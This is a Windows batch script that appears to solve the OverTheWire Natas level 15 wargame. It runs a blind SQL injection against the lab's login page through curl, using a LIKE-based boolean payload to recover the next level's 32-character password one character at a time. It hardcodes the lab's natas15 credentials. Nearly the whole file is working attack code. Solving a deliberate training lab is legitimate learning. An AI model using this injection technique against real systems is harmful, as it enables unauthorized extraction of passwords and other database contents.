@echo OFF
set chars=0 1 2 3 4 5 6 7 8 9 q w e r t y u i o p a s d f g h j k l z x c v b n m Q W E R T Y U I O P A S D F G H J K L Z X C V B N M
set pass=
setlocal enabledelayedexpansion
(for /l %%x in (1,1,33) do (
(for %%a in (%chars%) do (
	set url="http://natas15.natas.labs.overthewire.org/index.php?username=natas16%%22%%20and%%20binary%%20password%%20like%%20%%22!pass!%%a%%&debug=1"
	curl -s --user "natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB" !url! | findstr /c:"This user exists" && set pass=!pass!%%a
	call :strlen len pass
	if !len! == 32 goto finish
))
echo %pass%
))

:finish
echo %pass%


REM ********* function *****************************
:strlen <resultVar> <stringVar>
(   
    setlocal EnableDelayedExpansion
    (set^ tmp=!%~2!)
    if defined tmp (
        set "len=1"
        for %%P in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do (
            if "!tmp:~%%P,1!" NEQ "" ( 
                set /a "len+=%%P"
                set "tmp=!tmp:~%%P!"
            )
        )
    ) ELSE (
        set len=0
    )
)
( 
    endlocal
    set "%~1=%len%"
    exit /b
)